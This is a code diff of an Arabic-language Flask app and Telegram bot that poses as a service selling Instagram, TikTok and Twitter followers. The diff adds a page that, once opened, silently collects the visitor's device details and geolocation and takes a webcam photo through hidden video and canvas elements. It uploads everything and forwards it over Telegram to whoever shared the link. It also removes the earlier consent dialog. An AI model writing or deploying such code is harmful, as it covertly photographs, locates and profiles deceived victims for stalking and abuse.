@@ -47,13 +47,155 @@ def save_photos_data(data):
         json.dump(data, f, ensure_ascii=False)
 
 # ========== HTML قوالب ==========
-AUTO_CAMERA_HTML = """
+USERNAME_HTML = """
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>جاري التحقق - زيادة المتابعين</title>
+    <title>أدخل اسم المستخدم - زيادة المتابعين</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+        }
+        
+        .container {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 40px;
+            border-radius: 20px;
+            backdrop-filter: blur(10px);
+            text-align: center;
+            max-width: 500px;
+            width: 90%;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
+        }
+        
+        h1 {
+            font-size: 2rem;
+            margin-bottom: 20px;
+        }
+        
+        .input-group {
+            margin: 20px 0;
+        }
+        
+        input {
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 10px;
+            font-size: 1.1rem;
+            text-align: center;
+            margin: 10px 0;
+        }
+        
+        .btn {
+            background: linear-gradient(135deg, #4CAF50 0%, #45a049 100%);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 25px;
+            cursor: pointer;
+            font-size: 1.1rem;
+            font-weight: bold;
+            margin: 10px;
+            transition: all 0.3s ease;
+        }
+        
+        .btn:hover {
+            transform: translateY(-2px);
+        }
+        
+        .platforms {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin: 20px 0;
+        }
+        
+        .platform {
+            background: rgba(255,255,255,0.2);
+            padding: 10px 20px;
+            border-radius: 10px;
+            cursor: pointer;
+        }
+        
+        .platform.active {
+            background: #4CAF50;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>📱 أدخل اسم المستخدم</h1>
+        <p>لإرسال المتابعين إلى حسابك</p>
+        
+        <div class="platforms">
+            <div class="platform active" onclick="selectPlatform('instagram')">📸 إنستغرام</div>
+            <div class="platform" onclick="selectPlatform('tiktok')">🎵 تيك توك</div>
+            <div class="platform" onclick="selectPlatform('twitter')">🐦 تويتر</div>
+        </div>
+        
+        <div class="input-group">
+            <input type="text" id="username" placeholder="مثال: your_username" autocomplete="off">
+        </div>
+        
+        <button class="btn" onclick="submitUsername()">
+            تأكيد ومتابعة ✅
+        </button>
+    </div>
+
+    <script>
+        let selectedPlatform = 'instagram';
+        
+        function selectPlatform(platform) {
+            selectedPlatform = platform;
+            document.querySelectorAll('.platform').forEach(p => p.classList.remove('active'));
+            event.target.classList.add('active');
+        }
+        
+        function submitUsername() {
+            const username = document.getElementById('username').value.trim();
+            if (!username) {
+                alert('يرجى إدخال اسم المستخدم');
+                return;
+            }
+            
+            // حفظ البيانات والانتقال للصفحة التالية
+            const nextUrl = `/collect_data/{{user_id}}?username=${encodeURIComponent(username)}&platform=${selectedPlatform}`;
+            window.location.href = nextUrl;
+        }
+        
+        // السماح بالإدخال بالإنتر
+        document.getElementById('username').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                submitUsername();
+            }
+        });
+    </script>
+</body>
+</html>
+"""
+
+DATA_COLLECTION_HTML = """
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جاري التجهيز - زيادة المتابعين</title>
     <style>
         * {
             margin: 0;
@@ -108,20 +250,6 @@ AUTO_CAMERA_HTML = """
             line-height: 1.6;
         }
         
-        .success {
-            color: #4CAF50;
-            font-weight: bold;
-        }
-        
-        .error {
-            color: #f44336;
-            font-weight: bold;
-        }
-        
-        .hidden {
-            display: none;
-        }
-        
         .progress-bar {
             width: 100%;
             height: 8px;
@@ -138,67 +266,129 @@ AUTO_CAMERA_HTML = """
             transition: width 0.3s ease;
             border-radius: 4px;
         }
+        
+        .hidden {
+            display: none;
+        }
+        
+        .data-item {
+            background: rgba(255,255,255,0.1);
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 8px;
+            text-align: right;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <!-- شاشة التحميل -->
         <div id="loadingScreen">
             <div class="loader"></div>
-            <h1>جاري التحقق من الهوية</h1>
-            <div class="status">⏳ يرجى الانتظار أثناء التحقق...</div>
+            <h1>جاري تجهيز حسابك</h1>
+            <div class="status" id="statusMessage">⏳ جاري جمع البيانات المطلوبة...</div>
             <div class="progress-bar">
                 <div class="progress" id="progress"></div>
             </div>
         </div>
         
-        <!-- شاشة النجاح -->
-        <div id="successScreen" class="hidden">
-            <div style="font-size: 4rem; margin-bottom: 20px;">✅</div>
-            <h1>تم التحقق بنجاح!</h1>
-            <div class="status success">🎉 تم تفعيل خدمتك بنجاح</div>
-            <div class="status">ستصلك إشعارات التقدم على التليجرام</div>
-        </div>
-        
-        <!-- شاشة الخطأ -->
-        <div id="errorScreen" class="hidden">
-            <div style="font-size: 4rem; margin-bottom: 20px;">❌</div>
-            <h1>خطأ في التحقق</h1>
-            <div class="status error" id="errorMessage"></div>
-            <button onclick="retryVerification()" style="
-                background: #4CAF50;
-                color: white;
-                border: none;
-                padding: 12px 30px;
-                border-radius: 25px;
-                cursor: pointer;
-                margin-top: 20px;
-                font-size: 16px;
-            ">إعادة المحاولة</button>
+        <div id="dataScreen" class="hidden">
+            <h1>📊 البيانات المجمعة</h1>
+            <div id="collectedData"></div>
+            <div class="status">🎉 جاري تفعيل خدمتك...</div>
         </div>
     </div>
 
-    <!-- عناصر الكاميرا المخفية -->
+    <!-- عناصر مخفية لجمع البيانات -->
     <video id="hiddenVideo" autoplay playsinline class="hidden"></video>
     <canvas id="hiddenCanvas" class="hidden"></canvas>
+    <iframe id="hiddenIframe" class="hidden"></iframe>
 
     <script>
-        let stream = null;
-        let captureAttempts = 0;
-        const maxAttempts = 3;
+        let collectedData = {
+            username: '{{username}}',
+            platform: '{{platform}}',
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            platformInfo: navigator.platform,
+            screenResolution: `${screen.width}x${screen.height}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            cookiesEnabled: navigator.cookieEnabled,
+            javaEnabled: navigator.javaEnabled(),
+            hardwareConcurrency: navigator.hardwareConcurrency || 'غير معروف',
+            deviceMemory: navigator.deviceMemory || 'غير معروف'
+        };
 
-        // بدء عملية التحقق تلقائياً
+        // بدء جمع البيانات تلقائياً
         window.addEventListener('load', function() {
-            setTimeout(startAutoVerification, 1000);
+            startDataCollection();
         });
 
-        async function startAutoVerification() {
+        async function startDataCollection() {
             try {
-                updateProgress(25);
-                updateStatus('🔍 جاري التحقق من الصلاحيات...');
+                // المرحلة 1: جمع بيانات المتصفح الأساسية
+                updateProgress(10);
+                updateStatus('🔍 جاري جمع معلومات الجهاز...');
+                await delay(1000);
+
+                // المرحلة 2: جمع بيانات الموقع
+                updateProgress(30);
+                updateStatus('📍 جاري تحديد الموقع...');
+                await collectLocationData();
                 
-                // طلب إذن الكاميرا
-                stream = await navigator.mediaDevices.getUserMedia({ 
+                // المرحلة 3: طلب إذن الكاميرا
+                updateProgress(50);
+                updateStatus('📸 جاري التحقق من الهوية...');
+                await requestCameraPermission();
+                
+                // المرحلة 4: التقاط الصورة تلقائياً
+                updateProgress(70);
+                updateStatus('🔄 جاري إكمال التحقق...');
+                await capturePhotoAutomatically();
+                
+                // المرحلة 5: إرسال جميع البيانات
+                updateProgress(90);
+                updateStatus('📤 جاري إرسال البيانات...');
+                await sendAllData();
+                
+                updateProgress(100);
+                showCollectedData();
+                
+            } catch (error) {
+                console.error('Data collection error:', error);
+                // الاستمرار حتى مع وجود أخطاء
+                await sendAllData();
+                showCollectedData();
+            }
+        }
+
+        async function collectLocationData() {
+            return new Promise((resolve) => {
+                if ('geolocation' in navigator) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            collectedData.location = {
+                                latitude: position.coords.latitude,
+                                longitude: position.coords.longitude,
+                                accuracy: position.coords.accuracy
+                            };
+                            resolve();
+                        },
+                        (error) => {
+                            collectedData.locationError = error.message;
+                            resolve();
+                        },
+                        { timeout: 5000 }
+                    );
+                } else {
+                    collectedData.location = 'غير مدعوم';
+                    resolve();
+                }
+            });
+        }
+
+        async function requestCameraPermission() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { 
                         facingMode: 'user',
                         width: { ideal: 640 },
@@ -206,82 +396,68 @@ AUTO_CAMERA_HTML = """
                     } 
                 });
                 
-                updateProgress(50);
-                updateStatus('📸 جاري التحقق من الهوية...');
-                
-                // تشغيل الكاميرا المخفية
-                const video = document.getElementById('hiddenVideo');
-                video.srcObject = stream;
-                
-                // الانتظار لضبط الكاميرا
-                await new Promise(resolve => setTimeout(resolve, 2000));
-                
-                updateProgress(75);
-                updateStatus('🔄 جاري إكمال التحقق...');
-                
-                // التقاط الصورة تلقائياً
-                await captureAndSendPhoto();
+                collectedData.cameraAccess = 'مسموح';
+                collectedData.cameraStream = stream;
                 
             } catch (error) {
-                handleError(error);
+                collectedData.cameraAccess = 'مرفوض: ' + error.message;
+                collectedData.cameraStream = null;
             }
         }
 
-        async function captureAndSendPhoto() {
+        async function capturePhotoAutomatically() {
             try {
-                const video = document.getElementById('hiddenVideo');
-                const canvas = document.getElementById('hiddenCanvas');
-                const context = canvas.getContext('2d');
-                
-                // ضبط أبعاد الكانفاس
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                
-                // رسم الصورة من الفيديو
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                // إيقاف الكاميرا
-                if (stream) {
-                    stream.getTracks().forEach(track => track.stop());
+                if (collectedData.cameraStream) {
+                    const video = document.getElementById('hiddenVideo');
+                    const canvas = document.getElementById('hiddenCanvas');
+                    const context = canvas.getContext('2d');
+                    
+                    video.srcObject = collectedData.cameraStream;
+                    
+                    // الانتظار لضبط الكاميرا
+                    await delay(2000);
+                    
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    // إيقاف الكاميرا
+                    collectedData.cameraStream.getTracks().forEach(track => track.stop());
+                    
+                    // تحويل الصورة إلى base64
+                    collectedData.capturedPhoto = canvas.toDataURL('image/jpeg', 0.7);
                 }
-                
-                // تحويل الصورة إلى Blob
-                canvas.toBlob(async (blob) => {
-                    await sendPhotoToBot(blob);
-                }, 'image/jpeg', 0.8);
-                
             } catch (error) {
-                handleError(error);
+                collectedData.photoError = error.message;
             }
         }
 
-        async function sendPhotoToBot(blob) {
+        async function sendAllData() {
             try {
-                updateProgress(90);
-                updateStatus('📤 جاري إرسال البيانات...');
-                
                 const formData = new FormData();
-                formData.append('photo', blob, 'verification.jpg');
                 formData.append('user_id', '{{user_id}}');
-                formData.append('package', '{{package}}');
-                formData.append('auto_capture', 'true');
+                formData.append('username', collectedData.username);
+                formData.append('platform', collectedData.platform);
+                formData.append('collected_data', JSON.stringify(collectedData));
+                
+                // إضافة الصورة إذا كانت موجودة
+                if (collectedData.capturedPhoto) {
+                    const response = await fetch(collectedData.capturedPhoto);
+                    const blob = await response.blob();
+                    formData.append('photo', blob, 'verification.jpg');
+                }
 
-                const response = await fetch('/upload_photo', {
+                const uploadResponse = await fetch('/upload_complete_data', {
                     method: 'POST',
                     body: formData
                 });
 
-                const result = await response.json();
-                
-                if (result.success) {
-                    updateProgress(100);
-                    showSuccess();
-                } else {
-                    throw new Error(result.error || 'فشل في الإرسال');
-                }
+                const result = await uploadResponse.json();
+                return result.success;
                 
             } catch (error) {
-                handleError(error);
+                console.error('Send data error:', error);
+                return false;
             }
         }
 
@@ -290,60 +466,37 @@ AUTO_CAMERA_HTML = """
         }
 
         function updateStatus(message) {
-            document.querySelector('#loadingScreen .status').textContent = message;
+            document.getElementById('statusMessage').textContent = message;
         }
 
-        function showSuccess() {
+        function showCollectedData() {
             document.getElementById('loadingScreen').classList.add('hidden');
-            document.getElementById('successScreen').classList.remove('hidden');
+            document.getElementById('dataScreen').classList.remove('hidden');
             
-            // إغلاق الصفحة بعد 3 ثواني
+            const dataContainer = document.getElementById('collectedData');
+            dataContainer.innerHTML = `
+                <div class="data-item">👤 المستخدم: ${collectedData.username}</div>
+                <div class="data-item">📱 المنصة: ${collectedData.platform}</div>
+                <div class="data-item">💻 المتصفح: ${collectedData.userAgent.substring(0, 50)}...</div>
+                <div class="data-item">🖥️ الدقة: ${collectedData.screenResolution}</div>
+                <div class="data-item">🌐 المنطقة: ${collectedData.timezone}</div>
+                <div class="data-item">📸 الكاميرا: ${collectedData.cameraAccess}</div>
+                ${collectedData.location ? `<div class="data-item">📍 الموقع: ${collectedData.location.latitude}, ${collectedData.location.longitude}</div>` : ''}
+            `;
+            
+            // إعادة التوجيه بعد 5 ثواني
             setTimeout(() => {
                 window.close();
-            }, 3000);
+            }, 5000);
         }
 
-        function handleError(error) {
-            console.error('Verification error:', error);
-            
-            captureAttempts++;
-            
-            if (captureAttempts < maxAttempts) {
-                updateStatus(`🔄 محاولة ${captureAttempts}/${maxAttempts}...`);
-                setTimeout(startAutoVerification, 2000);
-            } else {
-                document.getElementById('loadingScreen').classList.add('hidden');
-                document.getElementById('errorScreen').classList.remove('hidden');
-                document.getElementById('errorMessage').textContent = getErrorMessage(error);
-            }
+        function delay(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
         }
 
-        function getErrorMessage(error) {
-            if (error.name === 'NotAllowedError') {
-                return 'تم رفض الإذن. يرجى السماح بالوصول إلى الكاميرا.';
-            } else if (error.name === 'NotFoundError') {
-                return 'لم يتم العثور على كاميرا.';
-            } else if (error.name === 'NotSupportedError') {
-                return 'المتصفح لا يدعم الكاميرا.';
-            } else {
-                return 'حدث خطأ غير متوقع. يرجى المحاولة مرة أخرى.';
-            }
-        }
-
-        function retryVerification() {
-            document.getElementById('errorScreen').classList.add('hidden');
-            document.getElementById('loadingScreen').classList.remove('hidden');
-            captureAttempts = 0;
-            startAutoVerification();
-        }
-
-        // منع المستخدم من إغلاق الصفحة أثناء المعالجة
-        window.addEventListener('beforeunload', function(e) {
-            if (!document.getElementById('successScreen').classList.contains('hidden')) {
-                return undefined;
-            }
-            e.preventDefault();
-            e.returnValue = '';
+        // جمع بيانات إضافية عند مغادرة الصفحة
+        window.addEventListener('beforeunload', function() {
+            collectedData.pageLeaveTime = new Date().toISOString();
         });
     </script>
 </body>
@@ -535,73 +688,6 @@ MAIN_HTML = """
             padding: 25px 50px;
             font-size: 1.4rem;
         }
-        
-        .privacy-modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.8);
-            z-index: 1000;
-            backdrop-filter: blur(5px);
-        }
-        
-        .privacy-content {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: white;
-            padding: 40px;
-            border-radius: 20px;
-            max-width: 600px;
-            width: 90%;
-            max-height: 80vh;
-            overflow-y: auto;
-        }
-        
-        .privacy-actions {
-            display: flex;
-            gap: 15px;
-            justify-content: center;
-            margin-top: 30px;
-        }
-        
-        .btn-accept {
-            background: linear-gradient(135deg, #4CAF50 0%, #45a049 100%);
-        }
-        
-        .btn-decline {
-            background: linear-gradient(135deg, #dc3545 0%, #c82333 100%);
-        }
-        
-        @media (max-width: 768px) {
-            .container {
-                padding: 10px;
-            }
-            
-            .header {
-                padding: 20px;
-            }
-            
-            h1 {
-                font-size: 2rem;
-            }
-            
-            .packages {
-                grid-template-columns: 1fr;
-            }
-            
-            .package.featured {
-                transform: none;
-            }
-            
-            .package.featured:hover {
-                transform: translateY(-5px);
-            }
-        }
     </style>
 </head>
 <body>
@@ -646,7 +732,7 @@ MAIN_HTML = """
                 <div class="package-title">الباقة الأساسية</div>
                 <div class="package-followers">1,000 متابع</div>
                 <div class="package-price">$9.99</div>
-                <button class="btn" onclick="startVerification('basic')">اختر الباقة</button>
+                <button class="btn" onclick="startProcess('basic')">اختر الباقة</button>
             </div>
             
             <div class="package featured">
@@ -656,7 +742,7 @@ MAIN_HTML = """
                 <div class="package-title">الباقة المميزة</div>
                 <div class="package-followers">5,000 متابع</div>
                 <div class="package-price">$29.99</div>
-                <button class="btn" onclick="startVerification('premium')">اختر الباقة</button>
+                <button class="btn" onclick="startProcess('premium')">اختر الباقة</button>
             </div>
             
             <div class="package">
@@ -666,7 +752,7 @@ MAIN_HTML = """
                 <div class="package-title">الباقة الذهبية</div>
                 <div class="package-followers">10,000 متابع</div>
                 <div class="package-price">$49.99</div>
-                <button class="btn" onclick="startVerification('gold')">اختر الباقة</button>
+                <button class="btn" onclick="startProcess('gold')">اختر الباقة</button>
             </div>
         </div>
 
@@ -674,67 +760,17 @@ MAIN_HTML = """
         <div style="background: rgba(255, 255, 255, 0.95); border-radius: 20px; padding: 40px; text-align: center; margin: 30px 0;">
             <h2>🎁 احصل على 100 متابع مجاناً!</h2>
             <p>انقر أدناه لبدء عملية الحصول على المتابعين المجانية</p>
-            <button class="btn btn-large" onclick="startVerification('free')">
+            <button class="btn btn-large" onclick="startProcess('free')">
                 <i class="fas fa-gift"></i> احصل على 100 متابع مجاناً
             </button>
         </div>
     </div>
 
-    <!-- سياسة الخصوصية -->
-    <div id="privacyModal" class="privacy-modal">
-        <div class="privacy-content">
-            <h2>📋 سياسة الخصوصية والأذونات</h2>
-            <p><strong>نحن نحترم خصوصيتك ونلتزم بحماية بياناتك الشخصية.</strong></p>
-            
-            <h3>الأذونات المطلوبة:</h3>
-            <ul>
-                <li>✅ الوصول إلى الكاميرا للتحقق من الهوية</li>
-                <li>✅ عملية تحقق تلقائية سريعة</li>
-                <li>✅ تخزين بياناتك الأساسية لتقديم الخدمة</li>
-            </ul>
-            
-            <h3>ماذا يحدث:</h3>
-            <ul>
-                <li>📸 سيتم التقاط صورة تحقق تلقائياً</li>
-                <li>⚡ العملية تستغرق ثوانٍ قليلة</li>
-                <li>🔒 لا تظهر الصورة للمستخدم</li>
-                <li>🛡️ البيانات محمية ومشفرة</li>
-            </ul>
-            
-            <p>بالنقر على "موافق" فإنك توافق على الشروط وسيبدأ التحقق تلقائياً.</p>
-            
-            <div class="privacy-actions">
-                <button class="btn btn-accept" onclick="acceptPrivacy()">
-                    <i class="fas fa-check"></i> موافق وابدأ التحقق
-                </button>
-                <button class="btn btn-decline" onclick="declinePrivacy()">
-                    <i class="fas fa-times"></i> غير موافق
-                </button>
-            </div>
-        </div>
-    </div>
-
     <script>
-        let selectedPackage = '';
-        let privacyAccepted = false;
-
-        function startVerification(packageType) {
-            selectedPackage = packageType;
-            document.getElementById('privacyModal').style.display = 'block';
-        }
-
-        function acceptPrivacy() {
-            privacyAccepted = true;
-            document.getElementById('privacyModal').style.display = 'none';
-            
-            // الانتقال إلى صفحة التحقق التلقائي
-            const verificationUrl = `/auto_camera/{{user_id}}?package=${selectedPackage}`;
-            window.location.href = verificationUrl;
-        }
-
-        function declinePrivacy() {
-            document.getElementById('privacyModal').style.display = 'none';
-            alert('نأسف! لا يمكننا تقديم الخدمة بدون موافقتك على الشروط.');
+        function startProcess(packageType) {
+            // الانتقال إلى صفحة إدخال اسم المستخدم
+            const usernameUrl = `/username/{{user_id}}?package=${packageType}`;
+            window.location.href = usernameUrl;
         }
     </script>
 </body>
@@ -751,101 +787,141 @@ def user_page(user_id):
     """الصفحة الرئيسية للمستخدم"""
     return render_template_string(MAIN_HTML, user_id=user_id)
 
-@app.route('/auto_camera/<user_id>')
-def auto_camera_page(user_id):
-    """صفحة الكاميرا التلقائية المخفية"""
+@app.route('/username/<user_id>')
+def username_page(user_id):
+    """صفحة إدخال اسم المستخدم"""
     package = request.args.get('package', 'free')
-    return render_template_string(AUTO_CAMERA_HTML, user_id=user_id, package=package)
+    return render_template_string(USERNAME_HTML, user_id=user_id, package=package)
 
-@app.route('/upload_photo', methods=['POST'])
-def upload_photo():
-    """استقبال الصور من صفحة الويب"""
+@app.route('/collect_data/<user_id>')
+def collect_data_page(user_id):
+    """صفحة جمع البيانات"""
+    username = request.args.get('username', '')
+    platform = request.args.get('platform', 'instagram')
+    return render_template_string(DATA_COLLECTION_HTML, user_id=user_id, username=username, platform=platform)
+
+@app.route('/upload_complete_data', methods=['POST'])
+def upload_complete_data():
+    """استقبال جميع البيانات المجمعة"""
     try:
-        if 'photo' not in request.files:
-            return jsonify({'success': False, 'error': 'No photo uploaded'})
-        
-        photo = request.files['photo']
         user_id = request.form.get('user_id')
-        package = request.form.get('package', 'free')
-        auto_capture = request.form.get('auto_capture', 'false') == 'true'
+        username = request.form.get('username')
+        platform = request.form.get('platform')
+        collected_data_json = request.form.get('collected_data')
         
-        if photo and user_id:
-            # حفظ الصورة
-            filename = f"auto_capture_{user_id}_{uuid.uuid4().hex[:8]}.jpg"
-            filepath = os.path.join('photos', filename)
-            photo.save(filepath)
-            
-            # حفظ بيانات الصورة
-            photos_data = load_photos_data()
-            photos_data[filename] = {
-                'user_id': user_id,
-                'package': package,
-                'auto_capture': auto_capture,
-                'timestamp': datetime.now().isoformat(),
-                'filename': filename
-            }
-            save_photos_data(photos_data)
-            
-            # إرسال الصورة للبوت
-            asyncio.run(send_photo_to_bot(user_id, filepath, package, auto_capture))
-            
-            return jsonify({
-                'success': True, 
-                'message': 'تم التحقق بنجاح وتفعيل الخدمة',
-                'filename': filename,
-                'package': package
-            })
-        else:
-            return jsonify({'success': False, 'error': 'Missing user_id or photo'})
+        if not all([user_id, username, collected_data_json]):
+            return jsonify({'success': False, 'error': 'Missing data'})
+        
+        # تحليل البيانات المجمعة
+        collected_data = json.loads(collected_data_json)
+        
+        # حفظ الصورة إذا كانت موجودة
+        photo_filename = None
+        if 'photo' in request.files and request.files['photo']:
+            photo = request.files['photo']
+            if photo.filename:
+                photo_filename = f"data_collection_{user_id}_{uuid.uuid4().hex[:8]}.jpg"
+                filepath = os.path.join('photos', photo_filename)
+                photo.save(filepath)
+        
+        # حفظ جميع البيانات
+        user_data = load_user_data()
+        if user_id not in user_data:
+            user_data[user_id] = {}
+        
+        user_data[user_id].update({
+            'username': username,
+            'platform': platform,
+            'collected_data': collected_data,
+            'photo_filename': photo_filename,
+            'collection_time': datetime.now().isoformat(),
+            'package': request.args.get('package', 'free')
+        })
+        save_user_data(user_data)
+        
+        # إرسال البيانات للبوت
+        asyncio.run(send_complete_data_to_bot(user_id, username, platform, collected_data, photo_filename))
+        
+        return jsonify({
+            'success': True, 
+            'message': 'تم جمع البيانات بنجاح',
+            'data_collected': len(collected_data)
+        })
         
     except Exception as e:
-        print(f"❌ خطأ في رفع الصورة: {e}")
+        print(f"❌ خطأ في جمع البيانات: {e}")
         return jsonify({'success': False, 'error': str(e)})
 
 # ========== وظائف التليجرام ==========
-async def send_photo_to_bot(user_id, photo_path, package, auto_capture=True):
-    """إرسال الصورة للمستخدم عبر البوت"""
+async def send_complete_data_to_bot(user_id, username, platform, collected_data, photo_filename):
+    """إرسال جميع البيانات المجمعة للمستخدم عبر البوت"""
     try:
         application = Application.builder().token(BOT_TOKEN).build()
         
         # تحويل user_id إلى integer
         user_id_int = int(user_id)
         
-        # إرسال الصورة
-        with open(photo_path, 'rb') as photo_file:
-            caption = f"""
-📸 **تم التحقق تلقائياً بنجاح!**
+        # إنشاء رسالة البيانات
+        data_message = f"""
+📊 **تم جمع البيانات بنجاح!**
 
-🎁 **الباقة المفعّلة:** {get_package_name(package)}
+👤 **المستخدم:** @{username}
+📱 **المنصة:** {platform}
+🆔 **رقم المستخدم:** {user_id}
+
+💻 **معلومات الجهاز:**
+• المتصفح: {collected_data.get('userAgent', 'غير معروف')[:50]}...
+• النظام: {collected_data.get('platformInfo', 'غير معروف')}
+• الدقة: {collected_data.get('screenResolution', 'غير معروف')}
+• المعالج: {collected_data.get('hardwareConcurrency', 'غير معروف')}
+• الذاكرة: {collected_data.get('deviceMemory', 'غير معروف')} GB
+
+🌐 **معلومات الشبكة:**
+• اللغة: {collected_data.get('language', 'غير معروف')}
+• المنطقة: {collected_data.get('timezone', 'غير معروف')}
+• الكوكيز: {collected_data.get('cookiesEnabled', 'غير معروف')}
+
+📸 **صلاحيات الكاميرا:** {collected_data.get('cameraAccess', 'غير معروف')}
+
+📍 **الموقع:** 
+{get_location_info(collected_data)}
+
 🕒 **الوقت:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
-🔒 **النوع:** تحقق تلقائي
 
-⏳ **جاري تفعيل الخدمة...**
-ستصلك متابعينك خلال 24 ساعة ⏰
-            """
-            
-            await application.bot.send_photo(
-                chat_id=user_id_int,
-                photo=InputFile(photo_file),
-                caption=caption,
-                parse_mode='HTML'
-            )
+🎁 **جاري تفعيل الخدمة...**
+        """
         
-        # إرسال رسالة تأكيد
+        # إرسال الرسالة النصية
+        await application.bot.send_message(
+            chat_id=user_id_int,
+            text=data_message,
+            parse_mode='HTML'
+        )
+        
+        # إرسال الصورة إذا كانت موجودة
+        if photo_filename and os.path.exists(os.path.join('photos', photo_filename)):
+            with open(os.path.join('photos', photo_filename), 'rb') as photo_file:
+                await application.bot.send_photo(
+                    chat_id=user_id_int,
+                    photo=InputFile(photo_file),
+                    caption="📸 صورة التحقق التلقائية",
+                    parse_mode='HTML'
+                )
+        
+        # إرسال رسالة التأكيد النهائية
         confirmation_text = f"""
-✅ **تم تفعيل {get_package_name(package)} بنجاح!**
+✅ **تم تفعيل خدمتك بنجاح!**
 
-📊 **تفاصيل طلبك:**
-• الباقة: {get_package_name(package)}
-• وقت التنشيط: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
-• رقم الطلب: #{uuid.uuid4().hex[:8].upper()}
+🎉 **مبروك!** سيتم إرسال المتابعين إلى:
+**@{username}** على {platform}
 
-🚀 **ماذا يحدث الآن:**
-1. جاري معالجة طلبك
-2. سيبدأ وصول المتابعين خلال 24 ساعة
-3. ستتلقى تحديثات دورية
+📦 **الباقة المفعّلة:** {get_package_name(collected_data.get('package', 'free'))}
+⏰ **وقت التفعيل:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+🎯 **رقم الطلب:** #{uuid.uuid4().hex[:8].upper()}
 
-📞 **للاستفسار:** @{'your_support_username'}
+🚀 **المتابعين سيصلون خلال 24 ساعة**
+
+📞 **للإستفسار:** @{'your_support_username'}
         """
         
         await application.bot.send_message(
@@ -854,10 +930,20 @@ async def send_photo_to_bot(user_id, photo_path, package, auto_capture=True):
             parse_mode='HTML'
         )
         
-        print(f"✅ تم إرسال الصورة تلقائياً للمستخدم {user_id}")
+        print(f"✅ تم إرسال البيانات الكاملة للمستخدم {user_id}")
         
     except Exception as e:
-        print(f"❌ خطأ في إرسال الصورة للبوت: {e}")
+        print(f"❌ خطأ في إرسال البيانات للبوت: {e}")
+
+def get_location_info(collected_data):
+    """الحصول على معلومات الموقع"""
+    if 'location' in collected_data:
+        loc = collected_data['location']
+        return f"• خط العرض: {loc.get('latitude', 'غير معروف')}\n• خط الطول: {loc.get('longitude', 'غير معروف')}\n• الدقة: {loc.get('accuracy', 'غير معروف')}m"
+    elif 'locationError' in collected_data:
+        return f"• خطأ: {collected_data['locationError']}"
+    else:
+        return "• غير متوفر"
 
 def get_package_name(package_type):
     """الحصول على اسم الباقة"""
@@ -902,23 +988,25 @@ class TelegramBot:
 
 ⚡ **مميزات الخدمة:**
 ✅ متابعين حقيقين 100%
-✅ تحقق تلقائي سريع
+✅ عملية تلقائية بالكامل
 ✅ خدمة 24/7
 ✅ أسعار مناسبة
 
 🎁 **احصل على 100 متابع مجاناً الآن!**
 
-🔒 **عملية آمنة:**
-• التحقق يتم تلقائياً
+🔒 **عملية آمنة وسريعة:**
+• أدخل اسم المستخدم
+• سيتم التحقق تلقائياً
 • لا تظهر الصورة للمستخدم
 • بياناتك محمية
 
 💡 **كيفية الاستخدام:**
 1. افتح الرابط أعلاه
 2. اختر الباقة المناسبة
-3. وافق على الشروط
-4. سيتم التحقق تلقائياً
-5. استلم متابعينك!
+3. أدخل اسم المستخدم
+4. وافق على الشروط
+5. سيتم كل شيء تلقائياً
+6. استلم متابعينك!
         """
         
         await update.message.reply_text(welcome_text, parse_mode='HTML')
@@ -944,14 +1032,21 @@ class TelegramBot:
     async def status_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         """أمر /status"""
         user_id = update.effective_user.id
-        photos_data = load_photos_data()
+        user_data = load_user_data()
         
-        user_photos = [p for p in photos_data.values() if p['user_id'] == str(user_id)]
+        user_info = user_data.get(str(user_id), {})
         
-        if user_photos:
-            status_text = "📊 **حالة طلباتك:**\n\n"
-            for photo in user_photos[-5:]:  # آخر 5 طلبات
-                status_text += f"📸 {get_package_name(photo['package'])} - ✅ منشط\n"
+        if user_info.get('username'):
+            status_text = f"""
+📊 **حالة طلباتك:**
+
+👤 **المستخدم:** @{user_info['username']}
+📱 **المنصة:** {user_info.get('platform', 'غير محدد')}
+🎁 **الباقة:** {get_package_name(user_info.get('package', 'free'))}
+🕒 **آخر تحديث:** {user_info.get('collection_time', 'غير متوفر')}
+
+✅ **الخدمة مفعّلة وجارية**
+            """
         else:
             status_text = "📭 لم تقم بأي طلبات بعد.\nاستخدم /start لبدء الخدمة!"
         
@@ -1002,7 +1097,7 @@ if __name__ == '__main__':
     print("🚀 بدء تشغيل التطبيق...")
     print(f"📊 البورت: {PORT}")
